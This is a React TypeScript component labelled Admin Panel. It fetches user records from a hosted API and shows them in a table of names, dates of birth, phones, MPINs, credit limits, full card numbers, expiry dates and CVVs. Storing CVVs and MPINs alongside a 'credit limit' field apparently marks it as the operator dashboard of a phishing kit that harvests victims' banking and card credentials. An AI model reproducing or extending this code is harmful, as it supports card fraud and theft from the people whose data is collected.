import React, { useEffect, useState } from 'react';
import axios from 'axios';

interface UserData {
  id: number;
  name: string;
  dob: string;
  phone: string;
  mpin: string;
  credit_limit: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  submission_date: string;
}

const AdminPanel = () => {
  const [data, setData] = useState<UserData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  useEffect(() => {
    axios
      .get('https://api-2-hnij.onrender.com/api/users')
      .then((res) => setData(res.data))
      .catch((err) => setError('Failed to fetch data'))
      .finally(() => setLoading(false));
  }, []);

  if (loading) return <div className="p-4">Loading...</div>;
  if (error) return <div className="p-4 text-red-500">{error}</div>;

  return (
    <div>
      <div className="p-4 overflow-x-auto">
        <h2 className="text-xl font-bold mb-4">Admin Panel</h2>
        <table className="table-auto w-full border">
          <thead>
            <tr className="bg-gray-200">
              <th>ID</th>
              <th>Name</th>
              <th>DOB</th>
              <th>Phone</th>
              <th>MPIN</th>
              <th>Limit</th>
              <th>Card #</th>
              <th>Holder</th>
              <th>Expiry</th>
              <th>CVV</th>
              <th>Submitted</th>
              
            </tr>
          </thead>
          <tbody>
            {data.map((entry) => (
              <tr key={entry.id} className="border">
                <td>{entry.id}</td>
                <td>{entry.name}</td>
                <td>{entry.dob}</td>
                <td>{entry.phone}</td>
                <td>{entry.mpin || '-'}</td>
                <td>{entry.credit_limit || '-'}</td>
                <td>{entry.card_number || '-'}</td>
                <td>{entry.card_holder_name || '-'}</td>
                <td>{entry.expiry_date || '-'}</td>
                <td>{entry.cvv || '-'}</td>
                <td>{new Date(entry.submission_date).toLocaleString()}</td>
               
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default AdminPanel;
